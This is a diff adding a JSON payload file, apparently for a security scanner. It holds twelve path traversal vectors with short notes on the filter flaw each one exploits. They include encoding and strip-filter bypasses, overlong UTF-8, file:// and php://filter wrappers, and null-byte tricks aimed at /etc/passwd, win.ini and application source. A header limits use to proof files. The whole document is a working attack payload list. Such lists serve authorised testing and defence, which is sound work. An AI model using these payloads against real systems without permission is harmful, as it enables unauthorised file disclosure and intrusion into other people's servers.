@@ -1,0 +1,19 @@
+{
+  "class": "traversal",
+  "order": "bypass-first",
+  "note": "Read-only targets (/etc/passwd, /etc/hosts, boot.ini) as proof files. Never read credential stores beyond proving access.",
+  "payloads": [
+    { "id": "trav::01", "vector": "....//....//etc/passwd", "note": "dot-dot-slash strip-bypass (naive replace)" },
+    { "id": "trav::02", "vector": "%2e%2e%2f%2e%2e%2fetc/passwd", "note": "single URL-encode" },
+    { "id": "trav::03", "vector": "%252e%252e%252fetc/passwd", "note": "double URL-encode — decode-chain bugs" },
+    { "id": "trav::04", "vector": "..%5c..%5cwindows\\win.ini", "note": "backslash encoding, Windows" },
+    { "id": "trav::05", "vector": "....\\....\\windows\\win.ini", "note": "dot-dot-backslash strip-bypass" },
+    { "id": "trav::06", "vector": "../../../../etc/passwd", "note": "deep-walk classic — depth over 8" },
+    { "id": "trav::07", "vector": "/etc/passwd", "note": "absolute path if the app concatenates" },
+    { "id": "trav::08", "vector": "%c0%ae%c0%ae/", "note": "overlong UTF-8 dot (legacy containers)" },
+    { "id": "trav::09", "vector": "file:///etc/passwd", "note": "scheme-based if input is a URL" },
+    { "id": "trav::10", "vector": "php://filter/convert.base64-encode/resource=index.php", "note": "PHP wrapper — base64 keeps output clean" },
+    { "id": "trav::11", "vector": "../../../../etc/hosts", "note": "smaller file — faster diffs" },
+    { "id": "trav::12", "vector": "..%00/etc/passwd", "note": "null-byte suffix (legacy PHP only)" }
+  ]
+}
